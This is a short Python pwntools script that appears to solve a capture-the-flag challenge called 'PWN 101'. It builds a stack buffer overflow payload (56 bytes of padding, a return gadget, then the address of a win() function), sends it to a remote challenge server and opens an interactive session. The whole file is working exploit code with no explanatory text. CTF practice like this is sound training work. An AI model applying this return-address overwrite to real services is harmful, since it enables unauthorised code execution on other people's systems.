from pwn import *

# Set the target binary
binary = './pwnme'  # Replace with actual binary name if different
elf = ELF(binary)

# Offset to overwrite the return address
offset = 56
ret_gadget = 0x40101a
win_address = elf.symbols['win']  # Address of the win() function

# Craft the payload
payload = b'A' * offset + p64(ret_gadget) + p64(win_address)

# Option to run locally or remotely
local = False

if local:
    # Run the process locally
    conn = process(binary)
else:
    # Connect to the remote server
    conn = remote('0.cloud.chals.io', 13545)

# Wait for the welcome message
conn.recvuntil("Welcome to PWN 101\n")

# Send the payload
print("Sending payload...")
conn.sendline(payload)

# Interact with the shell (if successful)
conn.interactive()
